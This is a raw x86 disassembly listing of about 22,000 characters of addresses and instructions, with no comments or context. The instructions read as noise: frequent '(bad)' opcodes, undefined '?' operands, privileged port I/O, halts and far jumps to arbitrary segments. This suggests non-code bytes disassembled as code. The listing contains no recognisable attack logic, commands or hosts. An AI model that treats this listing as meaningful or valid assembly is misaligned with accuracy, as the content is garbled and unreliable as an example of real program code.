  419f74:	dec    edx
  419f75:	add    edi,DWORD PTR [edi-0x37]
  419f78:	xor    DWORD PTR [ebp+0x6a],ebp
  419f7b:	jge    0x419f8e
  419f7d:	jmp    0x419f98
  419f7f:	fnstcw WORD PTR [ebp-0x1b]
  419f82:	rcr    DWORD PTR [esp+eax*8],1
  419f85:	pminub mm5,mm6
  419f88:	pop    esp
  419f89:	pop    es
  419f8a:	(bad)  
  419f8b:	mov    edx,0x88f6da08
  419f90:	add    BYTE PTR [eax+0x13],cl
  419f93:	mov    esp,0x2c5a4362
  419f98:	mov    cl,0x17
  419f9a:	leave  
  419f9b:	mov    bl,BYTE PTR [ebx-0x5f86aada]
  419fa1:	ret    
  419fa2:	mov    eax,ds:0xb77661e0
  419fa7:	sbb    esi,DWORD PTR [edx]
  419fa9:	dec    eax
  419faa:	mov    ebp,0xb34e7cfe
  419faf:	cmp    al,0x61
  419fb1:	sbb    dl,BYTE PTR [ebp-0x634f024]
  419fb7:	pushw  ds
  419fb9:	mov    bl,0xd2
  419fbb:	push   ds
  419fbc:	and    DWORD PTR [ebx],esp
  419fbe:	outs   dx,BYTE PTR ds:[esi]
  419fbf:	das    
  419fc0:	jae    0x419f9f
  419fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc3:	scas   al,BYTE PTR es:[edi]
  419fc4:	and    BYTE PTR ds:0x2743a5ed,ah
  419fca:	repz jbe 0x419f78
  419fcd:	sbb    eax,eax
  419fcf:	test   eax,0x9598d6c0
  419fd4:	cmp    ebp,DWORD PTR [edx]
  419fd6:	aad    0xc3
  419fd8:	jle    0x41a014
  419fda:	mov    bh,0x8f
  419fdc:	in     eax,dx
  419fdd:	inc    esp
  419fde:	mov    ecx,0xd88cf1df
  419fe3:	mov    dh,0xa8
  419fe5:	arpl   WORD PTR [edi],di
  419fe7:	jnp    0x419f6d
  419fe9:	inc    eax
  419fea:	nop
  419feb:	adc    DWORD PTR [edx],ebp
  419fed:	aaa    
  419fee:	out    0x6e,eax
  419ff0:	inc    ebx
  419ff1:	cld    
  419ff2:	and    bh,BYTE PTR [ebx-0x47]
  419ff5:	push   es
  419ff6:	add    edi,DWORD PTR [esi]
  419ff8:	es xor eax,0x4e269e3b
  419ffe:	fwait
  419fff:	ret    
  41a000:	jg     0x419fcf
  41a002:	push   esi
  41a003:	add    BYTE PTR [esi],bl
  41a005:	sbb    cl,BYTE PTR [esi+0x6e]
  41a008:	mov    ah,0x2d
  41a00a:	addr16 dec ebx
  41a00c:	sbb    al,0x70
  41a00e:	jmp    0xe8ad:0xe024dd5d
  41a015:	loopne 0x41a059
  41a017:	mov    bh,0x26
  41a019:	xor    bh,BYTE PTR [ecx]
  41a01b:	and    esp,DWORD PTR [edi+0x4]
  41a01e:	xchg   ecx,eax
  41a01f:	mov    ds:0x64a54b31,eax
  41a024:	xchg   esp,eax
  41a025:	inc    eax
  41a026:	and    al,0xbe
  41a028:	add    DWORD PTR [esi+ecx*8-0x20],esp
  41a02c:	jmp    0x7534:0xbe30c39e
  41a033:	shr    edi,1
  41a035:	rcr    BYTE PTR [edi+0x6e],1
  41a038:	xchg   esi,eax
  41a039:	out    dx,al
  41a03a:	mov    edx,0x8ae0a1a0
  41a03f:	out    dx,al
  41a040:	mov    bl,0x25
  41a042:	mov    ecx,fs
  41a044:	dec    esi
  41a045:	dec    edi
  41a046:	icebp  
  41a047:	mov    ecx,0x14115f6c
  41a04c:	dec    ebp
  41a04d:	ss call 0x3c3ea3a2
  41a053:	push   0xffffffd6
  41a055:	jbe    0x41a0cf
  41a057:	and    DWORD PTR [esi-0x662751ca],0x1c7e17e
  41a061:	std    
  41a062:	xchg   edx,eax
  41a063:	je     0x419ff0
  41a065:	int    0x65
  41a067:	call   0xbab0:0x5f621424
  41a06e:	or     eax,0x8b58c7ac
  41a073:	into   
  41a074:	mov    esp,0x2058d03b
  41a079:	or     ecx,DWORD PTR [edi-0x13]
  41a07c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a07d:	(bad)  
  41a07e:	div    BYTE PTR [eax-0x4228c0e9]
  41a084:	hlt    
  41a085:	jp     0x41a0d6
  41a087:	jl     0x41a049
  41a089:	das    
  41a08a:	xchg   edx,eax
  41a08b:	test   DWORD PTR [ebp-0x4a0ba916],0xd3428001
  41a095:	imul   eax,DWORD PTR [edx-0x3c],0x20
  41a099:	sub    al,0xfa
  41a09b:	rcl    DWORD PTR [edi],0xc9
  41a09e:	call   0xa681b78e
  41a0a3:	jl     0x41a076
  41a0a5:	dec    eax
  41a0a6:	pop    ebx
  41a0a7:	push   edx
  41a0a8:	out    0xae,al
  41a0aa:	pop    ss
  41a0ab:	or     eax,0x3e738ad8
  41a0b0:	aam    0xa8
  41a0b2:	mov    ds:0xbb574d45,eax
  41a0b7:	jne    0x41a0c4
  41a0b9:	push   ebx
  41a0ba:	mov    cl,0x27
  41a0bc:	mov    ecx,eax
  41a0be:	and    eax,0x4b1c5458
  41a0c3:	stc    
  41a0c4:	outs   dx,BYTE PTR ds:[esi]
  41a0c5:	hlt    
  41a0c6:	xor    dl,BYTE PTR [eax]
  41a0c8:	retf   
  41a0c9:	mov    ebx,0x8227fa76
  41a0ce:	jl     0x41a082
  41a0d0:	pop    ebp
  41a0d1:	xor    bh,dl
  41a0d3:	scas   al,BYTE PTR es:[edi]
  41a0d4:	fstp   DWORD PTR ds:0xd9860b1
  41a0da:	pop    esp
  41a0db:	pusha  
  41a0dc:	dec    ebp
  41a0dd:	mov    dl,0x94
  41a0df:	sti    
  41a0e0:	and    eax,0x96dfc303
  41a0e5:	jge    0x41a105
  41a0e7:	arpl   WORD PTR [ebx-0x46],ax
  41a0ea:	and    BYTE PTR [edx],al
  41a0ec:	lds    ecx,FWORD PTR [ebx]
  41a0ee:	and    al,0xe3
  41a0f0:	rcr    DWORD PTR [edi],0x8c
  41a0f3:	sar    BYTE PTR [ecx],0xe1
  41a0f6:	rcr    DWORD PTR [edi+0x6d],1
  41a0f9:	pop    es
  41a0fa:	push   esp
  41a0fb:	test   BYTE PTR [ebx-0x7b],dl
  41a0fe:	adc    al,0xf4
  41a100:	outs   dx,DWORD PTR ds:[esi]
  41a101:	das    
  41a102:	push   edx
  41a103:	or     DWORD PTR [eax],0x1e
  41a106:	sub    al,0x27
  41a108:	pushf  
  41a109:	test   BYTE PTR [ebp-0x283aa9f6],0x26
  41a110:	popf   
  41a111:	mov    ah,0xba
  41a113:	xchg   ebx,eax
  41a114:	pop    ecx
  41a115:	test   DWORD PTR [edi],ecx
  41a117:	xchg   esp,eax
  41a118:	repnz sub al,0x91
  41a11b:	push   edi
  41a11c:	shr    BYTE PTR [esi+ebx*1],0x87
  41a120:	iret   
  41a121:	add    dh,BYTE PTR [ecx+0x189ed87f]
  41a127:	cmp    DWORD PTR [ebx+0x73],edx
  41a12a:	rcr    DWORD PTR [ebx+0x63],1
  41a12d:	cmp    eax,0xc695b575
  41a132:	ret    0x5270
  41a135:	adc    eax,0x7dd93948
  41a13a:	dec    esi
  41a13b:	repz ds jns 0x41a0e4
  41a13f:	shl    BYTE PTR [eax+0x5bd2497b],0x7e
  41a146:	shl    DWORD PTR [edx],0x8d
  41a149:	addr16 xchg ebx,eax
  41a14b:	mov    bl,BYTE PTR [eax+0x6ccdc33]
  41a151:	adc    edx,DWORD PTR [edi]
  41a153:	aaa    
  41a154:	xchg   esp,eax
  41a155:	adc    eax,0x6723344a
  41a15a:	jo     0x41a13a
  41a15c:	loopne 0x41a17e
  41a15e:	ror    DWORD PTR [esi],cl
  41a160:	aad    0x5e
  41a162:	ret    
  41a163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a164:	push   ds
  41a165:	mov    eax,ds:0xf55a55e8
  41a16a:	aas    
  41a16b:	adc    eax,0xcbaf4c3a
  41a170:	jns    0x41a1e7
  41a172:	xor    DWORD PTR ds:0x3441e7e6,ecx
  41a178:	xchg   esp,eax
  41a179:	ud2    
  41a17b:	nop
  41a17c:	jmp    0x41a17e
  41a17e:	hlt    
  41a17f:	nop
  41a180:	adc    ebx,edi
  41a182:	shr    BYTE PTR [edx],1
  41a184:	sbb    eax,0xe73b68a5
  41a189:	inc    bl
  41a18b:	mov    DWORD PTR [ecx],edi
  41a18d:	and    DWORD PTR [esp+ecx*8+0x5c],ebp
  41a191:	pop    ebp
  41a192:	arpl   ax,dx
  41a194:	jmp    0xbc60:0x82a9862a
  41a19b:	scas   eax,DWORD PTR es:[edi]
  41a19c:	leave  
  41a19d:	call   0x2bce0b58
  41a1a2:	nop
  41a1a3:	xlat   BYTE PTR ds:[ebx]
  41a1a4:	and    DWORD PTR [ecx-0x13],esp
  41a1a7:	sbb    BYTE PTR [eax],bl
  41a1a9:	xchg   ebp,eax
  41a1aa:	jp     0x41a19d
  41a1ac:	jb     0x41a1a2
  41a1ae:	jecxz  0x41a152
  41a1b0:	sub    ebx,DWORD PTR [ebp-0x2635060c]
  41a1b6:	retf   
  41a1b7:	pop    edx
  41a1b8:	int3   
  41a1b9:	mov    bl,0xbc
  41a1bb:	adc    al,0xf4
  41a1bd:	or     DWORD PTR [esi+eax*2-0x29ee32c2],edx
  41a1c4:	sbb    esp,DWORD PTR [esi]
  41a1c6:	xor    cl,BYTE PTR [ebx+0x7a6756a8]
  41a1cc:	push   esp
  41a1cd:	pushf  
  41a1ce:	add    ebx,DWORD PTR [ecx-0x70af541d]
  41a1d4:	in     al,dx
  41a1d5:	push   0x1e
  41a1d7:	push   esp
  41a1d8:	push   esp
  41a1d9:	pop    eax
  41a1da:	mov    bh,0xd4
  41a1dc:	icebp  
  41a1dd:	adc    BYTE PTR [ecx-0x61],bh
  41a1e0:	xchg   ebp,eax
  41a1e1:	scas   eax,DWORD PTR es:[edi]
  41a1e2:	mov    eax,ds:0xfbd5c3cf
  41a1e7:	sbb    al,0x3b
  41a1e9:	int    0x80
  41a1eb:	or     BYTE PTR ds:0x750912dd,dl
  41a1f1:	outs   dx,DWORD PTR ds:[esi]
  41a1f2:	dec    esp
  41a1f3:	adc    BYTE PTR [ecx-0x27e3ad61],al
  41a1f9:	outs   dx,BYTE PTR ds:[esi]
  41a1fa:	fld    TBYTE PTR [edi+0x21979d3d]
  41a200:	sbb    DWORD PTR [ecx+0x17],eax
  41a203:	shr    BYTE PTR [ebp+eiz*2-0x74],cl
  41a207:	aam    0x56
  41a209:	or     eax,0x2c85270f
  41a20e:	stc    
  41a20f:	mov    esp,0xd0aecafa
  41a214:	add    al,0x62
  41a216:	cmp    al,0xbc
  41a218:	dec    ecx
  41a219:	iret   
  41a21a:	xchg   ebx,eax
  41a21b:	shl    DWORD PTR [ebp-0x3c],1
  41a21e:	sbb    DWORD PTR [ebx-0x5c],eax
  41a221:	je     0x41a214
  41a223:	cmp    eax,0x904f5d11
  41a228:	mov    esi,0x670dca3c
  41a22d:	ins    DWORD PTR es:[edi],dx
  41a22e:	sub    DWORD PTR [ecx+0x26],eax
  41a231:	dec    eax
  41a232:	in     eax,0xe6
  41a234:	or     ecx,DWORD PTR [ebp+ebx*4-0x2bed953b]
  41a23b:	mov    ecx,0xed3144be
  41a240:	arpl   WORD PTR [edi+0x54],ax
  41a243:	fdivr  st(4),st
  41a245:	and    ebp,ebp
  41a247:	push   eax
  41a248:	(bad)  
  41a249:	push   eax
  41a24a:	lods   al,BYTE PTR ds:[esi]
  41a24b:	mov    ebp,esp
  41a24d:	jbe    0x41a236
  41a24f:	add    BYTE PTR [edi+eax*1+0x7d899655],dh
  41a256:	mov    ds:0xaaff4c7d,eax
  41a25b:	retf   0xaed8
  41a25e:	mov    edi,0xb4575e74
  41a263:	sub    BYTE PTR [eax],ah
  41a265:	mov    dh,0xf5
  41a267:	shr    edi,1
  41a269:	inc    esp
  41a26a:	dec    esp
  41a26b:	and    eax,0xc023d0a4
  41a270:	fst    DWORD PTR [esi+0x3]
  41a273:	add    dl,BYTE PTR [eax+0xf]
  41a276:	lea    eax,[edx+ebx*1]
  41a279:	xlat   BYTE PTR ds:[ebx]
  41a27a:	call   0xcbee:0x51604a9e
  41a281:	fld    TBYTE PTR [eax+0x48]
  41a284:	addr16 dec esp
  41a286:	sbb    eax,0x28bc4efd
  41a28b:	pop    esp
  41a28c:	xor    BYTE PTR [edi-0x1d1c3e3f],al
  41a292:	shl    BYTE PTR [ebx+edx*8-0x60440fa3],0x3d
  41a29a:	pop    ss
  41a29b:	or     eax,0x617cafa1
  41a2a0:	adc    al,0x99
  41a2a2:	repz dec DWORD PTR [ecx-0x4c]
  41a2a6:	mov    cl,0x6a
  41a2a8:	inc    ebp
  41a2a9:	adc    DWORD PTR [esi+ecx*1-0x1b],edx
  41a2ad:	popa   
  41a2ae:	pop    edx
  41a2af:	add    ebp,DWORD PTR [edi+eax*1]
  41a2b2:	inc    eax
  41a2b3:	mov    ss,edx
  41a2b5:	fcomip st,st(7)
  41a2b7:	out    0xf7,al
  41a2b9:	aas    
  41a2ba:	ret    
  41a2bb:	jmp    0x34da:0x2e826e6f
  41a2c2:	stc    
  41a2c3:	or     edx,DWORD PTR [esi-0x66]
  41a2c6:	out    dx,al
  41a2c7:	mov    esi,DWORD PTR [ebp+0x25f7a4fc]
  41a2cd:	neg    DWORD PTR [ebx]
  41a2cf:	sbb    BYTE PTR [eax+0x3f03c793],dl
  41a2d5:	das    
  41a2d6:	jge    0x41a329
  41a2d8:	push   edx
  41a2d9:	push   edi
  41a2da:	int3   
  41a2db:	int    0x3d
  41a2dd:	inc    ebx
  41a2de:	int3   
  41a2df:	jge    0x41a34a
  41a2e1:	imul   eax,DWORD PTR [eax+0x7593035d],0x86e2ba8
  41a2eb:	cdq    
  41a2ec:	ret    
  41a2ed:	adc    BYTE PTR [edx-0x745379df],0xde
  41a2f4:	dec    esi
  41a2f5:	add    DWORD PTR [eax+0x409a9da5],edi
  41a2fb:	jmp    0xdf8226e0
  41a300:	(bad)  
  41a301:	out    0x5,eax
  41a303:	or     eax,0xd3ab9e3c
  41a308:	add    ch,BYTE PTR [eax-0x64d3e109]
  41a30e:	sub    eax,0x6fb0df5d
  41a313:	xor    bl,ah
  41a315:	mov    ds,esi
  41a317:	sub    DWORD PTR [edi],ecx
  41a319:	out    0xd9,eax
  41a31b:	stc    
  41a31c:	sbb    DWORD PTR [ebx+0x2d],edi
  41a31f:	data16 jle 0x41a361
  41a322:	lods   al,BYTE PTR ds:[esi]
  41a323:	retf   0x6e46
  41a326:	dec    eax
  41a327:	(bad)  
  41a328:	(bad)  
  41a329:	cmp    cl,BYTE PTR [esp+edi*2+0x2b]
  41a32d:	pop    ecx
  41a32e:	sbb    DWORD PTR [eax+eax*2-0x78],esp
  41a332:	or     eax,0xc27273af
  41a337:	xor    eax,0x9c1b5ee6
  41a33c:	rcr    BYTE PTR [eax],cl
  41a33e:	sbb    DWORD PTR [ebx+edx*2-0x3e],ebx
  41a342:	(bad)  
  41a344:	xor    eax,0x8d6767d3
  41a349:	into   
  41a34a:	and    ebp,edx
  41a34c:	jmp    0xedb7:0x88add66
  41a353:	mov    ds:0x890fe45,eax
  41a358:	aad    0x9f
  41a35a:	fdivr  DWORD PTR [ecx]
  41a35c:	into   
  41a35d:	stc    
  41a35e:	shl    DWORD PTR [edx],0x39
  41a361:	aad    0x7b
  41a363:	jp     0x41a3e4
  41a365:	popf   
  41a366:	dec    eax
  41a367:	pop    es
  41a368:	mov    ?,WORD PTR ds:0xaa230507
  41a36e:	dec    ecx
  41a36f:	popf   
  41a370:	inc    ebx
  41a371:	dec    ecx
  41a372:	adc    esp,edi
  41a374:	push   ss
  41a375:	in     al,0x31
  41a377:	and    dh,al
  41a379:	out    0xcb,eax
  41a37b:	pop    eax
  41a37c:	add    BYTE PTR [edx+ecx*1-0x1c],0xe
  41a381:	add    esp,edi
  41a383:	scas   eax,DWORD PTR es:[edi]
  41a384:	(bad)  
  41a385:	out    dx,eax
  41a386:	push   ebx
  41a387:	popa   
  41a388:	xchg   DWORD PTR [edi],eax
  41a38a:	rcr    BYTE PTR [edi+0x22545775],0xa0
  41a391:	(bad)  
  41a392:	add    ecx,DWORD PTR [eax-0x39e37775]
  41a398:	dec    edi
  41a399:	dec    esi
  41a39a:	outs   dx,BYTE PTR ds:[esi]
  41a39b:	mov    DWORD PTR [esi+esi*1+0x40490fb6],ebp
  41a3a2:	(bad)
  41a3a7:	outs   dx,BYTE PTR ds:[esi]
  41a3a8:	dec    ecx
  41a3a9:	add    dl,bl
  41a3ab:	stos   BYTE PTR es:[edi],al
  41a3ac:	repnz (bad) 
  41a3ae:	nop
  41a3af:	inc    edi
  41a3b0:	jne    0x41a3af
  41a3b2:	(bad)  
  41a3b3:	push   esp
  41a3b4:	lahf   
  41a3b5:	cld    
  41a3b6:	jg     0x41a3c9
  41a3b8:	mov    ?,WORD PTR [eax+0x1dc03c7e]
  41a3be:	and    edi,DWORD PTR [eax]
  41a3c0:	pop    eax
  41a3c1:	inc    edx
  41a3c2:	add    bl,ch
  41a3c4:	je     0x41a404
  41a3c6:	push   esp
  41a3c7:	leave  
  41a3c8:	sbb    ebp,ecx
  41a3ca:	jmp    0xaa17:0xeec2ea3e
  41a3d1:	inc    esi
  41a3d2:	xchg   esi,eax
  41a3d3:	and    eax,0x8bebd8a3
  41a3d8:	ds jae 0x41a36e
  41a3db:	ret    0x4e55
  41a3de:	test   al,0x59
  41a3e0:	es xchg esi,eax
  41a3e2:	jg     0x41a42b
  41a3e4:	dec    ebx
  41a3e5:	scas   al,BYTE PTR es:[edi]
  41a3e6:	retf   0x9174
  41a3e9:	ror    DWORD PTR [edi+0x199c9870],1
  41a3ef:	jnp    0x41a456
  41a3f1:	or     al,0x3b
  41a3f3:	in     al,0x8c
  41a3f5:	cmp    DWORD PTR [ebx+0x5f421929],0xfffffff7
  41a3fc:	data16 aam 0xb1
  41a3ff:	outs   dx,DWORD PTR ds:[esi]
  41a400:	add    ebp,DWORD PTR [edi+0x31]
  41a403:	jne    0x41a406
  41a405:	nop
  41a406:	sar    DWORD PTR [eax+0x7020bb44],cl
  41a40c:	fwait
  41a40d:	jmp    0xaa764e76
  41a412:	inc    ebx
  41a413:	mov    ch,0x69
  41a415:	out    dx,al
  41a416:	fst    DWORD PTR [esi-0x12]
  41a419:	add    al,0x72
  41a41b:	pop    ebx
  41a41c:	fmul   QWORD PTR [edi-0x4dc6ec97]
  41a422:	jmp    0x41a41c
  41a424:	into   
  41a425:	xchg   edx,eax
  41a426:	mov    bl,0xcc
  41a428:	push   cs
  41a429:	mov    cl,0xf2
  41a42b:	mov    esp,0xb5e03ba2
  41a430:	mov    ebx,0xc0fa1d46
  41a435:	mov    dh,0x55
  41a437:	int3   
  41a438:	adc    esi,DWORD PTR es:0x1b730e7
  41a43f:	adc    eax,0x4847aaa7
  41a444:	add    DWORD PTR [eax+0x717fedc3],ebp
  41a44a:	adc    dh,BYTE PTR [ecx-0x1c]
  41a44d:	sar    ebx,cl
  41a44f:	lds    ecx,FWORD PTR [eax-0x7c]
  41a452:	sti    
  41a453:	fadd   DWORD PTR [ebp+0x32]
  41a456:	xchg   BYTE PTR [ebx-0x18],ch
  41a459:	pop    ds
  41a45a:	cmp    BYTE PTR [esi],ch
  41a45c:	mov    ah,0x7e
  41a45e:	sahf   
  41a45f:	jnp    0x41a4d9
  41a461:	aam    0xd4
  41a463:	xchg   ebp,eax
  41a464:	jbe    0x41a401
  41a466:	leave  
  41a467:	test   BYTE PTR [eax],dh
  41a469:	inc    edi
  41a46a:	xchg   DWORD PTR [ecx-0x6b],edx
  41a46d:	xor    al,0xa1
  41a46f:	cs enter 0x9dd,0x37
  41a474:	xlat   BYTE PTR ds:[ebx]
  41a475:	in     al,dx
  41a476:	stc    
  41a477:	(bad)  
  41a478:	repz cmp DWORD PTR [esi],0x4d68e418
  41a47f:	inc    esi
  41a480:	aad    0x75
  41a482:	xlat   BYTE PTR ds:[ebx]
  41a483:	ss push cs
  41a485:	cmc    
  41a486:	std    
  41a487:	stos   BYTE PTR es:[edi],al
  41a488:	jne    0x41a4e9
  41a48a:	lods   al,BYTE PTR ds:[esi]
  41a48b:	je     0x41a4bc
  41a48d:	mov    ecx,0xb1b308a6
  41a492:	ins    BYTE PTR es:[edi],dx
  41a493:	or     eax,0xdecb6a14
  41a498:	call   0x664e603c
  41a49d:	(bad)  
  41a49f:	push   ebp
  41a4a0:	jp     0x41a493
  41a4a2:	neg    DWORD PTR ds:0x8c723fb9
  41a4a8:	inc    esp
  41a4a9:	ins    DWORD PTR es:[edi],dx
  41a4aa:	mov    ds:0x329d4361,al
  41a4af:	push   edi
  41a4b0:	ja     0x41a4cf
  41a4b2:	pop    ebp
  41a4b3:	jg     0x41a4b7
  41a4b5:	pop    edi
  41a4b6:	fwait
  41a4b7:	arpl   WORD PTR [edi],cx
  41a4b9:	jmp    0x6750cc06
  41a4be:	stos   DWORD PTR es:[edi],eax
  41a4bf:	jecxz  0x41a490
  41a4c1:	lods   eax,DWORD PTR ds:[esi]
  41a4c2:	push   0xef8bdbbe
  41a4c7:	inc    eax
  41a4c8:	les    esp,FWORD PTR [edx-0x55911a0d]
  41a4ce:	cmp    BYTE PTR [ebx+0x76],ch
  41a4d1:	lods   al,BYTE PTR ds:[esi]
  41a4d2:	in     eax,0x8b
  41a4d4:	pop    ebx
  41a4d5:	enter  0x7a6c,0xdf
  41a4d9:	arpl   WORD PTR [ecx],bx
  41a4db:	fst    QWORD PTR [edx]
  41a4dd:	bound  ebp,QWORD PTR [ecx+0x2e]
  41a4e0:	stc    
  41a4e1:	pop    ebp
  41a4e2:	mov    ax,gs:0x578dba7a
  41a4e9:	dec    eax
  41a4ea:	sbb    BYTE PTR ds:0x12074907,bl
  41a4f0:	mov    eax,0x3641bd07
  41a4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4f6:	pop    edx
  41a4f7:	scas   eax,DWORD PTR es:[edi]
  41a4f8:	out    dx,eax
  41a4f9:	sub    DWORD PTR [ecx],esi
  41a4fb:	fwait
  41a4fc:	gs push ds
  41a4fe:	push   ebp
  41a4ff:	icebp  
  41a500:	xor    esi,DWORD PTR [edx+0x1f21d72f]
  41a506:	mov    bh,0xf
  41a508:	sbb    DWORD PTR [esp+eax*8-0x4c],0x369838b5
  41a510:	loopne 0x41a4a3
  41a512:	cmc    
  41a513:	fidivr DWORD PTR [esi-0x5f]
  41a516:	test   DWORD PTR [edi-0x27],ebx
  41a519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a51a:	mov    bl,0x44
  41a51c:	pop    ebx
  41a51d:	add    BYTE PTR [ecx+0x19],dl
  41a520:	pop    eax
  41a521:	aam    0xa4
  41a523:	bound  ecx,QWORD PTR [eax]
  41a525:	and    ah,al
  41a527:	cmp    al,BYTE PTR [ecx-0x2351703c]
  41a52d:	pop    es
  41a52e:	addr16 shrd eax,esp,0x20
  41a533:	add    ch,BYTE PTR [esi-0x29f329bc]
  41a539:	rol    DWORD PTR [ecx-0x4cb37621],cl
  41a53f:	adc    DWORD PTR [eax-0x54],eax
  41a542:	fst    QWORD PTR [ecx]
  41a544:	data16 (bad) 
  41a546:	int3   
  41a547:	mov    BYTE PTR [esi+0x7a],cl
  41a54a:	mov    BYTE PTR [edi],dl
  41a54c:	dec    BYTE PTR [ebp-0x34]
  41a54f:	sub    BYTE PTR [esp+esi*1-0x26cd1df5],cl
  41a556:	lods   eax,DWORD PTR ds:[esi]
  41a557:	fsubp  st(3),st
  41a559:	adc    DWORD PTR [esi],edi
  41a55b:	and    al,dl
  41a55d:	or     DWORD PTR [ebx],0xffffffb8
  41a560:	inc    esi
  41a561:	icebp  
  41a562:	fidiv  WORD PTR [edi+0x795cade7]
  41a568:	add    ah,cl
  41a56a:	cmc    
  41a56b:	add    dh,BYTE PTR es:[eax-0x38f69862]
  41a572:	add    al,0x2d
  41a574:	xor    esi,DWORD PTR [edi+0x72]
  41a577:	jns    0x41a593
  41a579:	dec    edi
  41a57a:	in     al,dx
  41a57b:	fcmovnu st,st(1)
  41a57d:	or     DWORD PTR [ecx+0x58],0x81c16ac0
  41a584:	adc    eax,0x3de271bd
  41a589:	sbb    DWORD PTR [ecx+0x31],edx
  41a58c:	scas   eax,DWORD PTR es:[edi]
  41a58d:	mov    eax,0x6748f571
  41a592:	hlt    
  41a593:	mov    esi,0xd59586
  41a598:	pop    eax
  41a599:	ins    BYTE PTR es:[edi],dx
  41a59a:	test   BYTE PTR [ebx+eax*1-0xc],0x2c
  41a59f:	(bad)  
  41a5a1:	inc    ebx
  41a5a2:	sahf   
  41a5a3:	popa   
  41a5a4:	xor    DWORD PTR [ebx+0x32],ebp
  41a5a7:	push   edx
  41a5a8:	xor    BYTE PTR [ebx-0x56178442],ch
  41a5ae:	mov    ss,ebp
  41a5b0:	std    
  41a5b1:	(bad)  
  41a5b2:	shl    DWORD PTR [ebx-0x5a],cl
  41a5b5:	aaa    
  41a5b6:	in     al,dx
  41a5b7:	repz int 0xde
  41a5ba:	in     al,0xa8
  41a5bc:	xchg   esi,eax
  41a5bd:	xor    DWORD PTR [bp+di],ebx
  41a5c0:	xchg   ebx,edi
  41a5c2:	and    eax,0x667f0a2f
  41a5c7:	jmp    0x41a60b
  41a5c9:	add    BYTE PTR [ebx],dh
  41a5cb:	and    BYTE PTR [ebp+0x10],bh
  41a5ce:	mov    ebx,0x3048695c
  41a5d3:	arpl   WORD PTR [edi+0x33e9d79e],si
  41a5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5da:	or     ebp,eax
  41a5dc:	xor    eax,0x74b568f2
  41a5e1:	hlt    
  41a5e2:	test   eax,0x57ba678e
  41a5e7:	out    0xed,eax
  41a5e9:	cmp    cl,BYTE PTR [edi-0x780c652]
  41a5ef:	sub    DWORD PTR [eax-0x56e0751a],0x66
  41a5f6:	sbb    edx,DWORD PTR [ebp-0x3]
  41a5f9:	xor    esi,DWORD PTR [edi+eiz*4-0x5aa252c0]
  41a600:	dec    esp
  41a601:	xchg   edx,eax
  41a602:	and    DWORD PTR [ecx],edx
  41a604:	test   DWORD PTR [ebp+0x44],eax
  41a607:	xor    eax,0x22d39e8d
  41a60c:	popa   
  41a60d:	mov    bl,0x7f
  41a60f:	mov    bh,0xb5
  41a611:	pop    ebp
  41a612:	or     ah,BYTE PTR [ebx+eiz*8-0x1b0c0f1e]
  41a619:	imul   DWORD PTR [esi+eax*2-0x63]
  41a61d:	retf   0x67aa
  41a620:	jmp    0x41a60a
  41a622:	fsubr  DWORD PTR [ecx-0x1f]
  41a625:	cdq    
  41a626:	dec    ecx
  41a627:	mov    al,ds:0x2a1dc85e
  41a62c:	shl    edx,1
  41a62e:	fcom   QWORD PTR [eax]
  41a630:	xchg   esi,eax
  41a631:	fld    QWORD PTR [eax]
  41a633:	pushf  
  41a634:	inc    esi
  41a635:	sub    cl,0x81
  41a638:	shl    DWORD PTR [edi],1
  41a63a:	out    dx,eax
  41a63b:	xor    al,0xf1
  41a63d:	sbb    esp,ebp
  41a63f:	jp     0x41a674
  41a641:	(bad)  
  41a642:	scas   eax,DWORD PTR es:[edi]
  41a643:	enter  0xd5c1,0xd
  41a647:	or     DWORD PTR [ecx-0x5cc58989],0xffffff81
  41a64e:	xchg   di,ax
  41a650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a651:	ret    0x56e4
  41a654:	push   esi
  41a655:	test   DWORD PTR [esi+0x44e4c97],edi
  41a65b:	daa    
  41a65c:	xor    ecx,DWORD PTR [ebx]
  41a65e:	aam    0x8d
  41a660:	sahf   
  41a661:	in     eax,dx
  41a662:	mov    dl,0xdf
  41a664:	(bad)
  41a667:	xlat   BYTE PTR ds:[ebx]
  41a668:	inc    edi
  41a669:	mov    ah,0x1e
  41a66b:	push   es
  41a66c:	cmp    al,0x79
  41a66e:	dec    ecx
  41a66f:	cs jge 0x41a6ee
  41a672:	mov    es,WORD PTR [esi]
  41a674:	xchg   esp,eax
  41a675:	std    
  41a676:	mov    eax,ds:0x9d479ca8
  41a67b:	push   edi
  41a67c:	rcl    BYTE PTR [ebp+0x3],1
  41a67f:	xchg   BYTE PTR [eax+0x64],bl
  41a682:	cmp    al,bl
  41a684:	ds cld 
  41a686:	int3   
  41a687:	jae    0x41a6ba
  41a689:	ins    DWORD PTR es:[edi],dx
  41a68a:	jns    0x41a688
  41a68c:	(bad)  [eax+0x65e5b4ff]
  41a692:	mov    esi,0xe06136b0
  41a697:	sbb    eax,0x88c4ab2f
  41a69c:	das    
  41a69d:	adc    ebp,ecx
  41a69f:	dec    eax
  41a6a0:	xchg   ebp,eax
  41a6a1:	repnz test BYTE PTR [ecx+ecx*2],dl
  41a6a5:	hlt    
  41a6a6:	popf   
  41a6a7:	lahf   
  41a6a8:	ss popa 
  41a6aa:	xchg   edx,eax
  41a6ab:	(bad)  
  41a6ac:	adc    eax,0x25bd352e
  41a6b1:	aaa    
  41a6b2:	ret    0xe139
  41a6b5:	xchg   BYTE PTR [ecx-0x1897399a],dh
  41a6bb:	mov    ds:0xf2ecccd5,al
  41a6c0:	clc    
  41a6c1:	frstor [edx-0x2c]
  41a6c4:	retf   0xe84d
  41a6c7:	jecxz  0x41a73b
  41a6c9:	stos   DWORD PTR es:[edi],eax
  41a6ca:	mov    cl,0x55
  41a6cc:	(bad)  
  41a6cf:	and    eax,DWORD PTR [edi+0x31]
  41a6d2:	es fs sub al,0xa6
  41a6d6:	cli    
  41a6d7:	aas    
  41a6d8:	retf   
  41a6d9:	call   0x7fab:0x3a6f188
  41a6e0:	in     eax,dx
  41a6e1:	and    DWORD PTR [ebp+0x65],esp
  41a6e4:	xchg   edx,eax
  41a6e5:	push   ebp
  41a6e6:	fistp  WORD PTR [edx]
